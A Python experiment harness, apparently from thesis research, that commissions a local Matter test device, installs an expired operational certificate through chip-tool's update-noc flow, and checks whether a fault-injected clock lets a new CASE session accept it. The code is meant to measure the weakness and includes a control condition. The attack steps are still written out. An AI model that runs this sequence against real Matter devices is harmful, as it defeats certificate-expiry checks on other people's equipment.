"""
RQ1 - CASE revalidation of an already-installed expired NOC.

On each iteration: reset, commission, install expired NOC via update-noc, open a NEW CASE session against the NodeId of the expired NOC, with chip-tool as validator.
  Without --withclock (default): MATTER_FAULT_CLOCK=1 on chip-tool.
      chip-tool falls back to LKGT. Expected: CASE session established (accepted).
  With --withclock: chip-tool uses its real clock (no fault injection).
      Expected: CASE session rejected with "Certificate expired".

"""

import argparse
import os
import subprocess
import time
import re
import csv
from datetime import datetime
from pathlib import Path

CHIP_TOOL = str(Path.home() / "connectedhomeip/out/host/chip-tool")
VICTIM_BIN = str(Path.home() / "connectedhomeip/examples/all-clusters-app/linux/out/debug/chip-all-clusters-app")
CERTS_DIR = Path.home() / "tfm-evidence/certs"
VICTIM_KVS = Path("/tmp/chip_kvs_test")
NEW_NODE_ID = "0x1122334455667788"


def run(cmd, log_path, env=None):
    #Run a command, dump stdout+stderr to the log file and returnss the text
    with open(log_path, "w") as f:
        subprocess.run(cmd, stdout=f, stderr=subprocess.STDOUT, env=env, text=True)
    return log_path.read_text()


def cleanup_previous_run():
    subprocess.run(["pkill", "-f", "chip-all-clusters-app"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(1)
    subprocess.run(["rm", "-rf", str(VICTIM_KVS)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(
        "rm -f /tmp/chip_tool_kvs /tmp/chip_tool_config*.ini /tmp/chip_config.ini "
        "/tmp/chip_factory.ini /tmp/chip_counters.ini",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )


def start_victim(log_path):
    env = os.environ.copy()
    env["MATTER_FAULT_CLOCK"] = "1"
    log_file = open(log_path, "w")
    proc = subprocess.Popen(
        [VICTIM_BIN, "--KVS", str(VICTIM_KVS)],
        stdout=log_file, stderr=subprocess.STDOUT, env=env, text=True
    )
    return proc, log_file


def wait_victim_ready(log_path, timeout_s=40):
    deadline = time.time() + timeout_s
    while time.time() < deadline:
        if log_path.exists() and "Disabling CHIPoBLE service" in log_path.read_text():
            return True
        time.sleep(1)
    return False


def run_one_iteration(i, with_clock, condition_label, evidence_dir, csv_writer, csv_file):
    iter_dir = evidence_dir / f"iter_{i}"
    iter_dir.mkdir(parents=True, exist_ok=True)

    def write_row(case_established, success, error_stage):
        csv_writer.writerow({
            "iteration": i,
            "timestamp": datetime.now().isoformat(timespec="seconds"),
            "condition": condition_label,
            "withclock": int(with_clock),
            "case_established": case_established,
            "success": success,
            "error_stage": error_stage,
        })
        csv_file.flush()

    cleanup_previous_run()
    victim_log = iter_dir / "victim.log"
    proc, log_file = start_victim(victim_log)

    if not wait_victim_ready(victim_log):
        write_row("FALSE", "FALSE", "victim_not_ready")
        proc.terminate()
        log_file.close()
        return

    try:
        # Commissioning 
        commission_log = iter_dir / "commission.log"
        text = run([CHIP_TOOL, "pairing", "onnetwork", "1", "20202021"], commission_log)
        if "Device commissioning completed with success" not in text:
            write_row("FALSE", "FALSE", "commission_failed")
            return

        # Attack: arm-fail-safe -> CSR -> signing -> update-noc 
        run([CHIP_TOOL, "generalcommissioning", "arm-fail-safe", "60", "0", "1", "0"],
            iter_dir / "armfailsafe.log")

        nonce = os.urandom(32).hex()
        csr_log = iter_dir / "csr.log"
        csr_text = run(
            [CHIP_TOOL, "operationalcredentials", "csrrequest", f"hex:{nonce}", "1", "0", "--IsForUpdateNOC", "1"],
            csr_log
        )
        m = re.search(r"NOCSRElements: ([0-9A-Fa-f]+)", csr_text)
        nocsr_hex = m.group(1) if m else None
        if not nocsr_hex:
            write_row("FALSE", "FALSE", "csr_extraction_failed")
            return

        sign_log = iter_dir / "sign.log"
        with open(sign_log, "w") as f:
            sign_result = subprocess.run(
                ["python3", "run_rq1_attack.py", nocsr_hex],
                cwd=CERTS_DIR, stdout=f, stderr=subprocess.STDOUT, text=True
            )
        if sign_result.returncode != 0:
            write_row("FALSE", "FALSE", "signing_failed")
            return

        noc_hex = (CERTS_DIR / "expired_noc_signed.hex").read_text().strip()
        updatenoc_log = iter_dir / "updatenoc.log"
        updatenoc_text = run(
            [CHIP_TOOL, "operationalcredentials", "update-noc", f"hex:{noc_hex}", "1", "0"],
            updatenoc_log
        )
        status_match = re.search(r"statusCode:\s*(\d+)", updatenoc_text)
        status = status_match.group(1) if status_match else None
        if status != "0":
            write_row("FALSE", "FALSE", f"update_noc_rejected_status_{status or 'none'}")
            return

        # new CASE session against the NodeId of the expired NOC
        case_log = iter_dir / "case_revalidation.log"
        env = os.environ.copy()
        if with_clock:
            env.pop("MATTER_FAULT_CLOCK", None)
        else:
            env["MATTER_FAULT_CLOCK"] = "1"
        case_text = run(
            [CHIP_TOOL, "operationalcredentials", "read", "trusted-root-certificates", NEW_NODE_ID, "0"],
            case_log, env=env
        )
        # check if "mNotAfterTime" appears in the log,or if certificate is accepted or rejected
        if "Session was established" in case_text:
            write_row("TRUE", "TRUE", "")
        elif "Certificate expired" in case_text or "mNotAfterTime" in case_text:
            write_row("FALSE", "TRUE", "rejected_certificate_expired")
        else:
            write_row("FALSE", "TRUE", "ambiguous_result")
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
        log_file.close()
        time.sleep(2)


def main():
    parser = argparse.ArgumentParser(description="RQ1 - CASE revalidation of an expired NOC.")
    parser.add_argument("--iterations", type=int, default=50)
    parser.add_argument("--withclock", action="store_true",
                         help="If passed: chip-tool validates with its real clock (control). "
                              "If not: chip-tool falls back to LKGT (MATTER_FAULT_CLOCK=1, attack condition).")
    args = parser.parse_args()

    condition_label = "case_realclock_control" if args.withclock else "case_lkgt_acceptance"
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    evidence_dir = Path.home() / f"tfm-evidence/rq1_{condition_label}_{timestamp}"
    evidence_dir.mkdir(parents=True, exist_ok=True)
    csv_path = evidence_dir / "results.csv"

    os.chdir(CERTS_DIR)
    fieldnames = ["iteration", "timestamp", "condition", "withclock",
                  "case_established", "success", "error_stage"]
    with open(csv_path, "w", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=fieldnames)
        writer.writeheader()
        for i in range(1, args.iterations + 1):
            print(f"=== ITERATION {i}/{args.iterations} (condition: {condition_label}, withclock={int(args.withclock)}) ===")
            run_one_iteration(i, args.withclock, condition_label, evidence_dir, writer, f)

    print(f"=== DONE ({condition_label}) ===")
    print(f"Results: {csv_path}")
    subprocess.run(["column", "-s,", "-t", str(csv_path)])


if __name__ == "__main__":
    main()
